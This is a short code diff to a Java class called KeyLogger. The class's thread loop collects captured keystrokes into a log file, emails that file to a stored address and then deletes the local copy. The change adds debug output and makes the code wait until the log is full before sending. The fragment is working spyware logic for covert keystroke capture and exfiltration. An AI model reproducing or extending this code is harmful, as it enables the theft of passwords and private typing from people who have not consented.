@@ -37,13 +37,20 @@ public class KeyLogger extends Thread {
 
     @Override
     public void run() {
+        
         while(true){
+//            System.out.println(" ");
             if(this.keybroad.isFullBuffer()){
                 try {
+                    System.out.println("full buffer");
                     logger.writeLog(this.keybroad.getKeyBuffer());
                     this.keybroad.refreshBuffers();
-                    this.sender.sendMail(ip, this.logger.getFilePath());
-                    this.logger.removeLog();
+                    if(logger.isFullLog()){
+                        System.out.println("full log");
+                        this.sender.sendMail(ip, this.logger.getFilePath());
+                        this.logger.removeLog();
+                    }
+                    
                 } catch (IOException ex) {
                     ex.printStackTrace();
                 }
